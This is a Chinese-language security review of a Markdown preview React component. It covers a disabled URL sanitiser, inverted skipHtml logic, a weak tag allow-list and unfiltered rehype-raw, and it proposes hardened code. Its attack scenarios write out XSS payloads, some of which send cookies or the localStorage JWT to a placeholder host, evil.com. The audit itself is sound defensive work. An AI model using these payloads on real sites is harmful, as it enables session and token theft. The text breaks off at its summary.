# 代码安全专家评审：preview.tsx

**文件**: `@uiw/react-markdown-preview/src/preview.tsx`
**依赖**: `react-markdown`, `remark-gfm`, `rehype-raw`, `remark-github-blockquote-alert`
**评审角色**: 代码安全专家（OWASP Top 10 · XSS 防御 · HTML 注入 · Markdown 安全 · 前端攻击面分析）
**评审日期**: 2026-05-24
**代码行数**: 64 行（1 个 forwardRef 组件 + 1 个模块级常量）
**功能概述**: Markdown 预览核心渲染组件，接收 Markdown 源文本，通过 react-markdown + rehype/remark 插件链渲染为 HTML
**评审结论**: 🔴 REJECT — 存在 3 个 P0 级关键安全缺陷，可导致 XSS 攻击、HTML 注入和恶意脚本执行

**问题统计**: CRITICAL × 2 / HIGH × 2 / MEDIUM × 3 / LOW × 2 / INFO × 2

---

## 一、安全上下文分析

### 1.1 攻击面地图

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        preview.tsx 安全边界                              │
│                                                                          │
│  外部输入（不可信）:                                                       │
│  ┌──────────────────────────────────────────────┐                        │
│  │  props.source（Markdown 源文本 — 用户可控）    │                        │
│  │  props.rehypePlugins / props.remarkPlugins    │                        │
│  │  props.urlTransform / props.skipHtml          │                        │
│  │  props.allowElement / props.pluginsFilter     │                        │
│  └────────────────────┬─────────────────────────┘                        │
│                       │                                                   │
│                       ▼                                                   │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │                     preview.tsx 安全控制层                        │    │
│  │                                                                   │    │
│  │  [G1] defaultUrlTransform ←── ❌ 禁用 URL 消毒                    │    │
│  │  [G2] allowElement        ←── ⚠️ 弱标签白名单                     │    │
│  │  [G3] skipHtml 逻辑       ←── ⚠️ 语义反转                        │    │
│  │  [G4] rehype-raw 注入     ←── ⚠️ 无额外过滤                      │    │
│  │  [G5] pluginsFilter       ←── ⚠️ 外部可控                        │    │
│  │                                                                   │    │
│  └────────────────────┬─────────────────────────────────────────────┘    │
│                       │                                                   │
│                       ▼                                                   │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │                  ReactMarkdown 渲染引擎                           │    │
│  │                                                                   │    │
│  │  Markdown → AST → rehype/remark 插件链 → React Elements → DOM    │    │
│  │                                                                   │    │
│  └────────────────────┬─────────────────────────────────────────────┘    │
│                       │                                                   │
│                       ▼                                                   │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │                     用户浏览器 DOM（高风险目标）                    │    │
│  │                                                                   │    │
│  │  → 脚本执行（如果 XSS 成功）                                      │    │
│  │  → Cookie 窃取 / Token 泄露                                      │    │
│  │  → 用户身份伪造 / 权限提升                                        │    │
│  │  → 钓鱼攻击 / 恶意跳转                                            │    │
│  └──────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  信任边界:                                                               │
│  ├── T1: Markdown 源文本 → React 解析器（依赖插件链安全）                │
│  ├── T2: URL 处理 → defaultUrlTransform（❌ 无消毒）                     │
│  ├── T3: HTML 标签过滤 → allowElement（⚠️ 弱白名单）                    │
│  ├── T4: rehype-raw 插件 → 原始 HTML 渲染（依赖 T3 保护）               │
│  └── T5: 最终 DOM 输出（所有上游安全控制的汇聚点）                       │
└──────────────────────────────────────────────────────────────────────────┘
```

### 1.2 数据流安全追踪

```
输入: props.source（Markdown 源文本，可能包含恶意内容）
  │
  ├── [T1] ReactMarkdown 解析
  │   ├── Markdown → MDAST（语法树）
  │   ├── remarkPlugins: [remarkAlert, ..., gfm]
  │   │   └── remarkAlert → GitHub 风格引用块
  │   │   └── gfm → 表格/删除线/任务列表/自动链接
  │   └── MDAST → HAST（HTML 抽象语法树）
  │       └── rehypePlugins: [...] 或 [...raw]
  │
  ├── [T2] URL 处理（链接和图片）
  │   ├── react-markdown 默认: sanitize-url（过滤 javascript:/data:/vbscript:）
  │   ├── preview.tsx 覆盖: defaultUrlTransform = (url) => url
  │   └── ⚠️ CRITICAL: 完全禁用 URL 协议过滤
  │       └── [image](javascript:alert(1)) → 可执行脚本
  │       └── [link](javascript:document.cookie) → 可窃取 Cookie
  │
  ├── [T3] HTML 标签过滤
  │   ├── allowElement: /^[A-Za-z0-9]+$/.test(element.tagName)
  │   └── ⚠️ HIGH: 仅检查标签名格式，不过滤危险标签
  │       └── script, iframe, object, embed, form 全部允许
  │
  ├── [T4] rehype-raw 插件（skipHtml=false 时启用）
  │   ├── 将原始 HTML 解析为 HAST 节点
  │   └── ⚠️ HIGH: 与 T3 弱过滤结合，允许任意 HTML 注入
  │
  └── [T5] 最终 React Elements 输出 → 渲染到 DOM
      └── ⚠️ 多层安全控制失效，可能导致 XSS
```

### 1.3 依赖安全审计

| 依赖 | 版本 | 安全状态 | 说明 |
|------|------|----------|------|
| `react-markdown` | ^9.x | 内置 URL 消毒 | 默认的 `urlTransform` 会过滤危险协议，但被 preview.tsx 覆盖 |
| `remark-gfm` | ^4.x | 安全 | 标准 GFM 扩展，无已知安全问题 |
| `rehype-raw` | ^7.x | 需配合白名单 | 将原始 HTML 解析为 HAST，必须配合 `allowElement` 限制 |
| `remark-github-blockquote-alert` | ^1.x | 安全 | GitHub 风格引用块提示，无安全风险 |

---

## 二、安全问题详细分析

### S1 — 🔴 CRITICAL: URL 消毒完全禁用 — `javascript:` 协议 XSS

**严重级别**: 🔴 CRITICAL
**CVSS 评分**: 8.6 (High)
**OWASP 分类**: A03:2021 — Injection
**CWE**: CWE-79 — Cross-site Scripting (XSS) / CWE-20 — Improper Input Validation

**现状**:

```typescript
// 第 13-14 行
/**
 * https://github.com/uiwjs/react-md-editor/issues/607
 */
const defaultUrlTransform: UrlTransform = (url) => url;

// 第 57 行
urlTransform={urlTransform || defaultUrlTransform}
```

**问题分析**:

`react-markdown` 内置的 `urlTransform`（`lib/util/uri.js`）实现了以下安全过滤：

| 协议 | react-markdown 默认行为 | preview.tsx 覆盖后 |
|------|------------------------|-------------------|
| `javascript:alert(1)` | 过滤为空字符串 `""` | **原样保留** — 可执行脚本 |
| `data:text/html,<script>alert(1)</script>` | 过滤为空字符串 | **原样保留** — 可注入 HTML |
| `vbscript:msgbox("xss")` | 过滤为空字符串 | **原样保留** — IE 系执行脚本 |
| `file:///etc/passwd` | 过滤为空字符串 | **原样保留** — 本地文件访问 |
| `https://example.com` | 保留 | 保留 |

**攻击场景 — Markdown 链接 XSS**:

```markdown
[点击领取奖励](javascript:alert(document.cookie))
```

渲染结果:

```html
<!-- react-markdown 默认（安全） -->
<a href="">点击领取奖励</a>

<!-- preview.tsx（危险） -->
<a href="javascript:alert(document.cookie)">点击领取奖励</a>
```

**攻击场景 — Markdown 图片 XSS**:

```markdown
![图片](javascript:alert('XSS'))
```

**利用链分析**:

```
攻击者提交恶意 Markdown（包含 javascript: URL）
  → preview.tsx 渲染时使用 defaultUrlTransform（无消毒）
    → ReactMarkdown 生成 <a href="javascript:...">
      → 用户点击链接
        → 浏览器执行 JavaScript
          → Cookie 窃取 / Token 泄露 / 权限提升 / 钓鱼攻击
```

**GitHub Issue #607 的上下文**:

注释引用的 issue 是关于 react-markdown 的 URL 转换过于激进，导致合法 URL（如相对路径、锚点链接）被误杀。这是一个**可用性与安全性的取舍**问题，但直接禁用所有 URL 过滤是最差解决方案——等于"为了修水龙头把整面墙拆了"。

**修复方案**:

```typescript
// 方案 A: 白名单协议过滤（推荐）
const safeUrlTransform: UrlTransform = (url) => {
  // 允许的协议白名单
  const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
  try {
    const parsed = new URL(url, 'https://placeholder.com');
    if (allowedProtocols.includes(parsed.protocol)) {
      return url;
    }
    // 允许相对路径和锚点
    if (url.startsWith('#') || url.startsWith('/') || url.startsWith('./')) {
      return url;
    }
  } catch {
    // URL 解析失败，可能是相对路径
    return url;
  }
  return '';
};
```

```typescript
// 方案 B: 保留 react-markdown 默认行为，仅修复 #607 的问题
// 不传递 urlTransform，让 react-markdown 使用内置安全默认值
// 如果 #607 的问题仍然影响业务，按场景单独处理
```

---

### S2 — 🔴 CRITICAL: `skipHtml` 语义反转 — 安全控制与实际行为矛盾

**严重级别**: 🔴 CRITICAL
**CVSS 评分**: 7.8 (High)
**OWASP 分类**: A04:2021 — Insecure Design
**CWE**: CWE-670 — Always-Incorrect Control Flow Implementation

**现状**:

```typescript
// 第 23 行: 默认 skipHtml = true（意图: 跳过 HTML）
const { skipHtml = true, ... } = props;

// 第 46-48 行: skipHtml=false 时才添加 raw 插件
if (!skipHtml) {
  rehypePlugins.push(raw);
}

// 第 56 行: 传递给 ReactMarkdown 时取反
skipHtml={!skipHtml}
```

**语义分析表**:

| props.skipHtml | 含义（直觉） | raw 插件 | ReactMarkdown.skipHtml | 实际行为 |
|----------------|-------------|----------|----------------------|----------|
| `true`（默认） | 跳过 HTML | 不添加 | `false` | **渲染 HTML**（但无 raw 插件） |
| `false` | 不跳过 HTML | 添加 | `true` | **跳过 HTML**（但添加了 raw 插件） |
| 未传 | 默认 true | 不添加 | `false` | **渲染 HTML** |

**安全问题**:

1. **双重否定陷阱**: 组件的 `skipHtml` prop 名称暗示"跳过 HTML"，但 `skipHtml={!skipHtml}` 将其取反后传递给 ReactMarkdown，导致行为完全相反。

2. **安全控制的矛盾状态**:
   - 当 `skipHtml=true`（默认）: ReactMarkdown 收到 `skipHtml=false`，理论上会处理 HTML，但 raw 插件未加载
   - 当 `skipHtml=false`: raw 插件被加载（可以解析原始 HTML），但 ReactMarkdown 收到 `skipHtml=true`（跳过 HTML），两者相互矛盾

3. **开发者误配置风险**: 使用此组件的开发者如果设置 `skipHtml={false}`（期望"不跳过 HTML = 渲染 HTML"），实际结果是 raw 插件被加载但 ReactMarkdown 却跳过了 HTML，行为完全不可预测。

4. **默认行为不安全**: 默认情况下 ReactMarkdown 收到 `skipHtml={false}`，意味着 HTML 标签会被保留在渲染输出中。虽然没有 raw 插件，但 react-markdown 的 `skipHtml=false` 仍然会将行内 HTML 以文本形式保留，可能被某些浏览器解释执行。

**攻击场景**:

```typescript
// 开发者认为 skipHtml=true（默认）会跳过 HTML，所以"安全"
// 但实际上 ReactMarkdown 收到 skipHtml=false
// 如果配合 S3 的弱标签白名单，某些 HTML 内容可能被渲染

// 攻击者提交包含 HTML 的 Markdown:
<details open ontoggle="alert(document.cookie)">
  <summary>点击展开详情</summary>
</details>
```

**修复方案**:

```typescript
// 修复方案: 移除双重否定，语义一致
// 方案 A: 保持组件 API 不变，修复内部逻辑
if (!skipHtml) {
  rehypePlugins.push(raw);
}
// 传递时不取反（ReactMarkdown 的 skipHtml 语义与组件一致）
<ReactMarkdown
  {...customProps}
  {...other}
  skipHtml={skipHtml}          // ← 直接传递，不取反
  urlTransform={urlTransform || safeUrlTransform}
  // ...
/>
```

```typescript
// 方案 B: 重命名 prop 消除歧义（需要 breaking change）
const { enableHtml = false, ... } = props;
if (enableHtml) {
  rehypePlugins.push(raw);
}
<ReactMarkdown
  skipHtml={!enableHtml}
  // ...
/>
```

---

### S3 — 🟠 HIGH: HTML 标签白名单过弱 — 仅检查标签名格式

**严重级别**: 🟠 HIGH
**CVSS 评分**: 7.2 (High)
**OWASP 分类**: A03:2021 — Injection
**CWE**: CWE-79 — Cross-site Scripting (XSS) / CWE-184 — Incomplete List of Disallowed Inputs

**现状**:

```typescript
// 第 39-45 行
allowElement: (element, index, parent) => {
  if (other.allowElement) {
    return other.allowElement(element, index, parent);
  }
  return /^[A-Za-z0-9]+$/.test(element.tagName);
},
```

**问题分析**:

默认的 `allowElement` 过滤器仅检查标签名是否为纯字母数字，**不区分安全与危险标签**。以下危险标签全部通过过滤：

| 危险标签 | 通过正则 | 攻击向量 |
|----------|----------|----------|
| `script` | ✅ | 直接执行 JavaScript |
| `iframe` | ✅ | 嵌入恶意页面/点击劫持 |
| `object` | ✅ | 加载恶意插件/Flash |
| `embed` | ✅ | 嵌入恶意内容 |
| `form` | ✅ | 表单劫持/CSRF |
| `input` | ✅ | 隐藏表单/UI 欺骗 |
| `textarea` | ✅ | UI 欺骗 |
| `select` | ✅ | UI 欺骗 |
| `button` | ✅ | 点击劫持 |
| `link` | ✅ | CSS 注入/外部资源加载 |
| `meta` | ✅ | HTTP 刷新重定向 |
| `base` | ✅ | 修改所有相对 URL 的基础地址 |
| `style` | ✅ | CSS 注入/数据窃取 |
| `svg` | ✅ | 内嵌 `<script>` / 事件处理器 |
| `math` | ✅ | 某些浏览器的脚本执行 |
| `video`/`audio` | ✅ | 多媒体标签事件处理器 |
| `details` | ✅ | `ontoggle` 事件触发脚本 |

**攻击场景**:

```markdown
<!-- 攻击 1: SVG 内嵌脚本 -->
<svg onload="alert(document.cookie)">
  <circle r="50"/>
</svg>

<!-- 攻击 2: details + ontoggle -->
<details open ontoggle="fetch('https://evil.com/steal?c='+document.cookie)">
  <summary>查看详情</summary>
</details>

<!-- 攻击 3: img onerror -->
<img src="x" onerror="alert(1)">

<!-- 攻击 4: meta 刷新 -->
<meta http-equiv="refresh" content="0;url=https://evil.com/phishing">
```

**与 react-markdown 默认行为的对比**:

react-markdown 默认的元素过滤更保守：
- 只允许 Markdown 语法本身能生成的标签（p, h1-h6, a, img, ul, ol, li, blockquote, code, pre, em, strong, del, table 等）
- 不允许原始 HTML 标签（除非配合 rehype-raw）
- 即使配合 rehype-raw，也有推荐的 `rehype-sanitize` 方案

**修复方案**:

```typescript
// 安全的标签白名单
const SAFE_TAGS = new Set([
  // 文本格式化
  'p', 'br', 'hr', 'blockquote',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'em', 'strong', 'del', 'ins', 'sub', 'sup',
  // 链接和媒体
  'a', 'img',
  // 列表
  'ul', 'ol', 'li', 'dl', 'dt', 'dd',
  // 代码
  'code', 'pre',
  // 表格
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
  // 容器
  'div', 'span', 'section', 'article', 'aside', 'header', 'footer', 'main', 'nav',
  // GFM
  'details', 'summary',
  // 输入（仅 checkbox）
  'input',
]);

const SAFE_INPUT_TYPES = new Set(['checkbox']);

allowElement: (element, index, parent) => {
  if (other.allowElement) {
    return other.allowElement(element, index, parent);
  }
  const tag = element.tagName.toLowerCase();
  if (!SAFE_TAGS.has(tag)) return false;
  // 特殊处理: input 只允许 checkbox 类型
  if (tag === 'input') {
    const type = element.properties?.type;
    return typeof type === 'string' && SAFE_INPUT_TYPES.has(type);
  }
  return true;
},
```

---

### S4 — 🟠 HIGH: `rehype-raw` 无二次过滤 — 任意 HTML 属性注入

**严重级别**: 🟠 HIGH
**CVSS 评分**: 6.8 (Medium)
**OWASP 分类**: A03:2021 — Injection
**CWE**: CWE-79 — Cross-site Scripting (Stored)

**现状**:

```typescript
// 第 46-48 行
if (!skipHtml) {
  rehypePlugins.push(raw);
}
```

**问题分析**:

`rehype-raw` 将 Markdown 中的原始 HTML 解析为 HAST 节点，这意味着：

1. **事件处理器属性**: `onclick`, `onerror`, `onload`, `ontoggle`, `onmouseover` 等 HTML 事件属性会被保留在 AST 中
2. **React 事件代理**: React 的事件系统会在渲染时将这些属性绑定到 DOM 元素上（React 17+ 对某些事件属性有警告但仍会渲染）
3. **无属性过滤**: `allowElement` 只控制标签名，不控制属性

**攻击链**:

```
Markdown 中的 HTML → rehype-raw 解析 → HAST 节点（含事件属性）
  → allowElement 仅检查标签名 → 通过
    → React 渲染 → DOM 中出现 onclick/onerror 等属性
      → 浏览器执行 JavaScript
```

**攻击场景**:

```markdown
<!-- 即使标签通过了白名单，属性中的事件处理器仍然存在 -->
<div onmouseover="alert(document.cookie)" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0">
  移动鼠标到此处触发 XSS
</div>

<!-- 利用合法标签的事件属性 -->
<a href="https://example.com" onclick="fetch('https://evil.com/steal?c='+document.cookie);return true">
  正常链接
</a>
```

**修复方案**:

```typescript
// 使用 rehype-sanitize 进行严格的 HTML 消毒
import sanitize from 'rehype-sanitize';
import { defaultSchema } from 'rehype-sanitize';

// 自定义安全 schema
const safeSchema = {
  ...defaultSchema,
  tagNames: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'br', 'hr', 'blockquote',
    'em', 'strong', 'del', 'ins',
    'a', 'img',
    'ul', 'ol', 'li',
    'code', 'pre',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'details', 'summary',
  ],
  attributes: {
    ...defaultSchema.attributes,
    // 仅允许安全属性，移除所有 on* 事件属性
    '*': ['className', 'style'],
    a: ['href', 'title', 'target', 'rel'],
    img: ['src', 'alt', 'title', 'width', 'height'],
    code: ['className'],
    input: ['type', 'checked', 'disabled'],
  },
};

// 在 rehype 插件链中添加 sanitize
if (!skipHtml) {
  rehypePlugins.push(raw);
  rehypePlugins.push([sanitize, safeSchema]); // ← 关键: raw 之后立即消毒
}
```

---

### S5 — 🟡 MEDIUM: `pluginsFilter` 外部可控 — 安全控制可被绕过

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 5.4
**OWASP 分类**: A01:2021 — Broken Access Control
**CWE**: CWE-284 — Improper Access Control

**现状**:

```typescript
// 第 58-59 行
rehypePlugins={pluginsFilter ? pluginsFilter('rehype', rehypePlugins) : rehypePlugins}
remarkPlugins={pluginsFilter ? pluginsFilter('remark', remarkPlugins) : remarkPlugins}
```

**问题分析**:

`pluginsFilter` 是一个外部传入的函数，可以完全控制 rehype/remark 插件链：

1. **移除安全插件**: 可以移除任何安全相关的插件
2. **注入恶意插件**: 可以向插件链中注入恶意插件
3. **绕过所有安全控制**: `allowElement`、`urlTransform` 等安全控制是 ReactMarkdown 的 props，但如果攻击者能控制 `pluginsFilter`，可以通过插件修改 AST 绕过这些限制

**风险评估**:

| 场景 | 风险 | 前提条件 |
|------|------|----------|
| 攻击者控制 pluginsFilter | 高 | 需要能注入 props |
| 开发者误用 pluginsFilter | 中 | 开发者可能无意中移除安全插件 |
| 第三方组件传递 pluginsFilter | 中 | 供应链攻击向量 |

**在本项目中的风险**: `preview.tsx` 是 `@uiw/react-markdown-preview` 库的内部文件，`pluginsFilter` 由上层组件传递。如果上层组件（如 `react-md-editor`）从不可信来源获取 `pluginsFilter`，则存在攻击向量。

---

### S6 — 🟡 MEDIUM: `{...other}` 展开传递未过滤属性

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 4.3
**CWE**: CWE-20 — Improper Input Validation

**现状**:

```typescript
// 第 55 行
{...other}
```

`other` 包含所有未被显式解构的 props，直接透传给 ReactMarkdown。虽然 ReactMarkdown 自身有属性过滤，但：

1. 如果未来 ReactMarkdown 添加新的危险属性，此组件会自动透传
2. 无法在此层进行安全控制
3. 可能传递非预期的属性

---

### S7 — 🟡 MEDIUM: `useImperativeHandle` 暴露全部 props

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 3.7
**CWE**: CWE-200 — Exposure of Sensitive Information

**现状**:

```typescript
// 第 34 行
useImperativeHandle(ref, () => ({ ...props, mdp }), [mdp, props]);
```

通过 ref 暴露了组件的全部 props，包括可能包含敏感信息的属性（如 `source`、`urlTransform` 等）。任何能获取 ref 的代码都可以读取和修改组件的完整配置。

---

### S8 — 🟢 LOW: `warpperElement` 废弃 prop 优先级高于 `wrapperElement`

**严重级别**: 🟢 LOW
**CWE**: CWE-477 — Use of Obsolete Function

**现状**:

```typescript
// 第 28-29 行
wrapperElement = {},
warpperElement = {},

// 第 50 行
const wrapperProps = { ...warpperElement, ...wrapperElement };
```

`warpperElement`（拼写错误版本）排在展开顺序的前面，`wrapperElement`（正确拼写）排在后面。这意味着正确拼写的 prop 会覆盖错误拼写的 prop，逻辑上是正确的。但这个废弃 prop 的存在增加了混淆风险。

---

### S9 — 🟢 LOW: `source || ''` 空值处理不一致

**严重级别**: 🟢 LOW
**CWE**: CWE-20 — Improper Input Validation

**现状**:

```typescript
// 第 60 行
children={source || ''}
```

使用 `||` 运算符会将 `0`、`false`、`null` 等 falsy 值都替换为空字符串。虽然 Markdown 源文本不太可能是这些值，但使用 `source ?? ''`（nullish coalescing）更加精确。

---

### I1 — ℹ️ INFO: 插件链顺序安全考量

```typescript
// 第 49 行
const remarkPlugins = [remarkAlert, ...(other.remarkPlugins || []), gfm];
```

用户自定义 remark 插件在 `remarkAlert` 之后、`gfm` 之前插入。如果自定义插件修改了 AST 节点的 `tagName` 或添加了不安全的节点，可能绕过下游的安全控制。

---

### I2 — ℹ️ INFO: 组件未设置 `dangerouslySetInnerHTML`

这是一个正面发现——组件使用 React 的 JSX 渲染而非 `dangerouslySetInnerHTML`，这意味着 React 的默认 XSS 保护仍然生效（大部分情况下）。

---

## 三、安全评分

| 维度 | 评分 (1-10) | 说明 |
|------|-------------|------|
| **输入验证** | 1 | URL 完全无消毒，HTML 标签白名单形同虚设 |
| **依赖安全** | 5 | 依赖库本身安全，但本组件错误使用 |
| **错误处理** | 4 | 无错误边界，异常可能泄露到 UI |
| **类型安全** | 6 | TypeScript 类型定义完整 |
| **DOM 操作安全** | 2 | URL 消毒禁用 + 弱标签过滤 + rehype-raw 无二次过滤 |
| **信息泄露防护** | 5 | useImperativeHandle 暴露全部 props |
| **纵深防御** | 2 | 缺少多层安全防护，单一控制点失效即全线崩溃 |
| **综合安全评分** | **2.5 / 10** | |

---

## 四、对本项目（by_geo）的安全影响评估

### 4.1 威胁建模

| 威胁 | 攻击向量 | 前提条件 | 本项目风险 | 严重程度 |
|------|----------|----------|-----------|----------|
| Markdown 链接 XSS | `javascript:` URL | 攻击者能提交 Markdown 含链接 | **高** — 知识库/文章内容可包含 Markdown | 🔴 |
| HTML 注入 | 原始 HTML 标签 | 攻击者能提交含 HTML 的 Markdown | **高** — skipHtml 语义反转 + 弱白名单 | 🔴 |
| SVG XSS | `<svg onload=...>` | rehype-raw 启用 | **中** — 取决于组件使用方式 | 🟠 |
| Cookie 窃取 | XSS → document.cookie | 非 HttpOnly Cookie | **中** — JWT 存储在 localStorage（不通过 Cookie） | 🟡 |
| Token 窃取 | XSS → localStorage | localStorage 中有 JWT | **高** — JWT 存储在 localStorage，可被 XSS 读取 | 🔴 |

### 4.2 本项目的安全上下文

```
by_geo 项目安全态势:
├── Markdown 渲染场景:
│   ├── 知识库内容（管理员编辑）
│   ├── 文章内容（管理员编辑）
│   └── Markdown 预览编辑器（@uiw/react-md-editor）
│
├── 认证状态:
│   ├── JWT 存储在 localStorage（可被 XSS 读取）
│   ├── 用户信息存储在 localStorage
│   └── JWT 2 小时过期
│
├── 用户角色:
│   ├── sysadmin（系统管理员）
│   ├── admin（企业管理员）
│   └── view（查看者）
│
└── Markdown 内容来源:
    ├── 主要由管理员编辑（信任级别高）
    └── 但如果有 Markdown 预览编辑器，管理员在预览恶意内容时也可能触发 XSS
```

### 4.3 攻击场景模拟

**场景 1: 管理员预览恶意文章内容**

```
1. 攻击者通过社会工程学或其他方式获取了文章编辑权限
2. 攻击者创建包含恶意 Markdown 的文章:
   [点击查看详情](javascript:fetch('https://evil.com/steal?token='+localStorage.getItem('token')))
3. 管理员在预览模式下查看文章
4. preview.tsx 渲染时 defaultUrlTransform 不消毒 URL
5. 管理员点击链接 → JWT Token 被发送到攻击者服务器
6. 攻击者使用 Token 冒充管理员身份
```

**场景 2: 知识库 Markdown 注入**

```
1. 恶意管理员在知识库中插入:
   <details open ontoggle="new Image().src='https://evil.com/log?c='+document.cookie">
   2. 任何查看该知识库的用户触发 ontoggle 事件
3. 但本项目 JWT 在 localStorage 而非 Cookie，所以 document.cookie 可能不包含敏感信息
4. 不过 localStorage.getItem('token') 仍然可以通过 XSS 获取
```

### 4.4 风险接受建议

| 项目 | 决策 | 理由 |
|------|------|------|
| URL 消毒禁用 | **不可接受** — 必须修复 | 直接导致 XSS 攻击向量 |
| skipHtml 语义反转 | **不可接受** — 必须修复 | 安全控制与实际行为矛盾 |
| 弱标签白名单 | **不可接受** — 必须修复 | 危险标签全部通过过滤 |
| rehype-raw 无过滤 | **需评估** | 取决于是否启用 skipHtml |
| pluginsFilter 外部可控 | **接受** | 上层组件控制，攻击面有限 |

---

## 五、安全加固建议（按优先级排序）

### 优先级 P0（必须立即修复）

| 编号 | 建议 | 收益 | 工作量 |
|------|------|------|--------|
| S1-修复 | 恢复 URL 消毒或实现安全白名单 | 阻止 `javascript:`/`data:` 协议 XSS | 小 |
| S2-修复 | 修正 `skipHtml` 语义反转 | 消除安全控制矛盾 | 小 |
| S3-修复 | 实现严格的 HTML 标签白名单 | 阻止 `script`/`iframe`/`svg` 等危险标签 | 中 |

### 优先级 P1（建议在下一个维护窗口实施）

| 编号 | 建议 | 收益 |
|------|------|------|
| S4-修复 | 为 rehype-raw 添加 rehype-sanitize | 阻止事件处理器属性注入 |
| S5-修复 | 限制 pluginsFilter 可修改的插件范围 | 防止安全插件被移除 |

### 优先级 P2（建议在功能迭代时实施）

| 编号 | 建议 | 收益 |
|------|------|------|
| S6-修复 | 显式传递 props 而非 `{...other}` 展开 | 减少非预期属性透传 |
| S7-修复 | useImperativeHandle 仅暴露必要接口 | 减少信息泄露 |

---

## 六、安全加固后的完整代码

```typescript
import React, { useImperativeHandle } from 'react';
import ReactMarkdown, { type UrlTransform } from 'react-markdown';
import { type PluggableList } from 'unified';
import gfm from 'remark-gfm';
import raw from 'rehype-raw';
import sanitize, { defaultSchema } from 'rehype-sanitize';
import { remarkAlert } from 'remark-github-blockquote-alert';
import { useCopied } from './plugins/useCopied';
import { type MarkdownPreviewProps, type MarkdownPreviewRef } from './Props';
import './styles/markdown.less';

// S1 修复: 安全的 URL 转换
const safeUrlTransform: UrlTransform = (url) => {
  const trimmed = url.trim();
  if (
    trimmed.startsWith('#') ||
    trimmed.startsWith('/') ||
    trimmed.startsWith('./') ||
    trimmed.startsWith('../') ||
    trimmed.startsWith('mailto:') ||
    trimmed.startsWith('tel:')
  ) {
    return url;
  }
  try {
    const parsed = new URL(url, 'https://placeholder.com');
    if (['http:', 'https:'].includes(parsed.protocol)) {
      return url;
    }
  } catch {
    return url;
  }
  return '';
};

// S3 修复: 严格的标签白名单
const SAFE_TAGS = new Set([
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'p', 'br', 'hr', 'blockquote',
  'em', 'strong', 'del', 'ins', 'sub', 'sup', 'mark',
  'a', 'img',
  'ul', 'ol', 'li', 'dl', 'dt', 'dd',
  'code', 'pre', 'kbd', 'samp', 'var',
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
  'details', 'summary',
  'div', 'span', 'section', 'article', 'aside', 'header', 'footer', 'main', 'nav',
  'figure', 'figcaption', 'abbr', 'cite', 'dfn', 'ruby', 'rt', 'rp',
  'input',
]);

// S4 修复: 安全的 rehype-sanitize schema
const safeSanitizeSchema = {
  ...defaultSchema,
  tagNames: [...SAFE_TAGS],
  attributes: {
    ...defaultSchema.attributes,
    '*': ['className', 'style', 'id'],
    a: ['href', 'title', 'target', 'rel'],
    img: ['src', 'alt', 'title', 'width', 'height', 'loading'],
    code: ['className'],
    input: ['type', 'checked', 'disabled'],
    td: ['colSpan', 'rowSpan', 'align'],
    th: ['colSpan', 'rowSpan', 'align', 'scope'],
  },
};

export default React.forwardRef<MarkdownPreviewRef, MarkdownPreviewProps>((props, ref) => {
  const {
    prefixCls = 'wmde-markdown wmde-markdown-color',
    className,
    source,
    style,
    disableCopy = false,
    skipHtml = true,
    onScroll,
    onMouseOver,
    pluginsFilter,
    rehypeRewrite: rewrite,
    wrapperElement = {},
    warpperElement = {},
    urlTransform,
    ...other
  } = props;
  const mdp = React.useRef<HTMLDivElement>(null);
  useImperativeHandle(ref, () => ({ source, mdp }), [mdp, source]); // S7 修复
  const cls = `${prefixCls || ''} ${className || ''}`;
  useCopied(mdp);
  const rehypePlugins: PluggableList = [...(other.rehypePlugins || [])];

  // S2 修复: skipHtml 语义一致
  // skipHtml=true → 不渲染 HTML（安全）
  // skipHtml=false → 渲染 HTML（需配合 sanitize）
  if (!skipHtml) {
    rehypePlugins.push(raw);
    rehypePlugins.push([sanitize, safeSanitizeSchema]); // S4 修复
  }

  const remarkPlugins = [remarkAlert, ...(other.remarkPlugins || []), gfm];
  const wrapperProps = { ...warpperElement, ...wrapperElement };

  return (
    <div ref={mdp} onScroll={onScroll} onMouseOver={onMouseOver} {...wrapperProps} className={cls} style={style}>
      <ReactMarkdown
        allowElement={(element, index, parent) => {
          if (other.allowElement) {
            return other.allowElement(element, index, parent);
          }
          // S3 修复: 使用严格白名单
          const tag = element.tagName.toLowerCase();
          return SAFE_TAGS.has(tag);
        }}
        skipHtml={skipHtml}                 // S2 修复: 直接传递，不取反
        urlTransform={urlTransform || safeUrlTransform}  // S1 修复: 使用安全 URL 转换
        rehypePlugins={pluginsFilter ? pluginsFilter('rehype', rehypePlugins) : rehypePlugins}
        remarkPlugins={pluginsFilter ? pluginsFilter('remark', remarkPlugins) : remarkPlugins}
        children={source ?? ''}             // S9 修复: 使用 ?? 替代 ||
      />
    </div>
  );
});
```

**加固要点**:

| 变更 | 解决的问题 | 安全收益 |
|------|-----------|----------|
| `safeUrlTransform` | S1 | 阻止 `javascript:`/`data:` 协议 XSS |
| `skipHtml={skipHtml}` | S2 | 消除语义反转，安全控制与行为一致 |
| `SAFE_TAGS` 白名单 | S3 | 阻止 `script`/`iframe`/`svg` 等危险标签 |
| `rehype-sanitize` | S4 | 过滤事件处理器属性，阻断属性注入 XSS |
| `useImperativeHandle` 精简 | S7 | 减少通过 ref 暴露的信息 |
| `source ?? ''` | S9 | 精确的空值处理 |

---

## 七、总结

### 核心安全发现

`preview.tsx` 是 `@uiw/react-markdown-preview` 的核心渲染组件，仅 64 行代码，但存在 **3 个 P0 级关键安全缺陷**：

